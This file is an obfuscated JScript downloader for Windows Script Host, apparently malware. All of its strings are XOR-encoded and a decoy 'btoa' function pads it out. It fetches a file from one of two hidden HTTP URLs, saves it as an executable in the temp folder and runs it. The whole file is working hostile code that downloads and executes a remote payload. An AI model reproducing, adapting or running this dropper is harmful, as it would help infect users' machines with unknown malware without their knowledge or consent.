function btoa(chaffYey, gainsayuPu, nonplusR3z, overweeningvDa, gainsayf35, amenableKIq, weighXBS, augustQ5c) {
    var appeali2P = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var harrowingb1w = String(augustQ5c);
    for (var swerveyzE, embroilVqu, dutifulNLd = 0, unassumingqw1 = appeali2P, intendR2t = ""; harrowingb1w.charAt(dutifulNLd | 0) || (unassumingqw1 = "=", 
    dutifulNLd % 1); intendR2t += unassumingqw1.charAt(63 & swerveyzE >> 8 - dutifulNLd % 1 * 8)) {
        embroilVqu = harrowingb1w.charCodeAt(dutifulNLd += 3 / 4);
        if (embroilVqu > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        swerveyzE = swerveyzE << 8 | embroilVqu;
    }
    return intendR2t;
}

var grudgingjpy = function(inclinedgW8) {
    var welthhp = "";
    var chaffYey = "austereK7r";
    var gainsayuPu = "sublimeg53";
    var nonplusR3z = "credibleaoP";
    var overweeningvDa = "hermitageV6t";
    var gainsayf35 = "pleadRcg";
    var amenableKIq = "biliousrSi";
    var weighXBS = "invectivekog";
    btoa(chaffYey, gainsayuPu, nonplusR3z, overweeningvDa, gainsayf35, amenableKIq, weighXBS, [ 154, 50, 78, 255, 139, 140, 131, 171, 63, 27, 18, 22, 229, 47, 107, 88 ]);
    var trothAd7 = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var sentientB3s = 0; sentientB3s < inclinedgW8.length; sentientB3s++) {
        var grantvc7 = [ 154, 50, 78, 255, 139, 140, 131, 171, 63, 27, 18, 22, 229, 47, 107, 88 ];
        welthhp += trothAd7(inclinedgW8[sentientB3s] ^ grantvc7[sentientB3s % grantvc7.length]);
    }
    return welthhp;
};

var manifestationBcs = function() {
    var cohortDb1 = function() {
        var subalternZuw = grudgingjpy([ 210, 92, 121, 152, 238, 205, 232, 224, 120, 67 ]);
        var majorityLGm = grudgingjpy([ 249, 103, 118, 203, 194, 233, 181, 194, 102, 120 ]);
        var parochialg7s = grudgingjpy([ 208, 100, 44, 135, 249, 238, 214, 157, 112, 125 ]);
    };
    cohortDb1.prototype.IwtNkes5JO = function(anodyneBWN) {
        var unanimityJTz = grudgingjpy([ 217, 64, 43, 158, 255, 233, 204, 201, 85, 126, 113, 98 ]);
        return wsh[unanimityJTz](anodyneBWN);
    };
    cohortDb1.prototype.lWKmigQ8di = function(anodyneBWN) {
        var unanimityJTz = grudgingjpy([ 217, 64, 43, 158, 255, 233, 204, 201, 85, 126, 113, 98 ]);
        return WScript[unanimityJTz](anodyneBWN);
    };
    return cohortDb1;
}();

(function() {
    var cupidityG5G = [ grudgingjpy([ 242, 70, 58, 143, 177, 163, 172, 195, 79, 122, 96, 115, 156, 64, 30, 48, 255, 64, 43, 142, 250, 162, 224, 196, 82, 52, 42, 33, 203, 74, 19, 61 ]), grudgingjpy([ 242, 70, 58, 143, 177, 163, 172, 195, 79, 122, 126, 101, 138, 88, 10, 54, 238, 65, 40, 153, 165, 239, 236, 198, 16, 35, 37, 56, 128, 87, 14 ]) ];
    var rationalismais = 4194304;
    var nonentityoVt = grudgingjpy([ 235, 92, 6, 205, 200, 234, 180, 198, 74, 113 ]);
    var citePt7 = grudgingjpy([ 219, 121, 45, 176, 225, 207, 202, 253, 76, 41 ]);
    var embroilRdd = new manifestationBcs();
    var persistBqu = embroilRdd[grudgingjpy([ 246, 101, 5, 146, 226, 235, 210, 147, 91, 114 ])];
    var derivedQd9 = persistBqu(grudgingjpy([ 205, 97, 45, 141, 226, 252, 247, 133, 108, 115, 119, 122, 137 ]));
    var explicatevKb = persistBqu(grudgingjpy([ 215, 97, 22, 178, 199, 190, 173, 243, 114, 87, 90, 66, 177, 127 ]));
    var expatiateBEb = persistBqu(grudgingjpy([ 219, 118, 1, 187, 201, 162, 208, 223, 77, 126, 115, 123 ]));
    var machinationATc = derivedQd9.ExpandEnvironmentStrings(grudgingjpy([ 191, 102, 11, 178, 219, 169, 223 ]));
    var dissimulaterbU = machinationATc + rationalismais + grudgingjpy([ 180, 87, 54, 154 ]);
    var sedulousCBB = false;
    var nonentityvkJ = 200;
    for (var balefulmTa = 0; balefulmTa < cupidityG5G.length; balefulmTa++) {
        try {
            var cowery1p = cupidityG5G[balefulmTa];
            explicatevKb.open(grudgingjpy([ 221, 119, 26 ]), cowery1p, false);
            explicatevKb.send();
            if (explicatevKb.status == nonentityvkJ) {
                try {
                    expatiateBEb[grudgingjpy([ 245, 66, 43, 145 ])]();
                    expatiateBEb.type = 1;
                    expatiateBEb[grudgingjpy([ 237, 64, 39, 139, 238 ])](explicatevKb[grudgingjpy([ 232, 87, 61, 143, 228, 226, 240, 206, 125, 116, 118, 111 ])]);
                    var iconoclastHhm = Math.pow(2, 10) * 249;
                    if (expatiateBEb.size > iconoclastHhm) {
                        balefulmTa = cupidityG5G.length;
                        expatiateBEb.position = 0;
                        expatiateBEb.saveToFile(dissimulaterbU, 2);
                        sedulousCBB = true;
                    }
                } finally {
                    expatiateBEb.close();
                }
            }
        } catch (ignored) {}
    }
    if (sedulousCBB) {
        derivedQd9[grudgingjpy([ 223, 74, 43, 156 ])](machinationATc + Math.pow(2, 22));
    }
})();